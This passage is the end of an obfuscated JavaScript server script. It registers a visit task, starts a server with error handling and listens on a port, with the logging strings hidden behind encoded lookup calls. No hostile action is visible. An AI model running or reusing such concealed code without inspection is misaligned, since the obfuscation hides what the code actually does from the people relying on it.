AddVisitTask();}catch(_0xebf734){console[_0x34d35(0x249)](_0x34d35(0x1eb),_0xebf734);}}startserver()[_0x2addb5(0x21f)](_0x22600e=>{const _0xdbda70=_0x2addb5;console[_0xdbda70(0x249)]('Unhandled\x20error\x20in\x20startserver:',_0x22600e);}),app['listen'](PORT,()=>console[_0x2addb5(0x26f)](_0x2addb5(0x1df)+PORT+'!'));
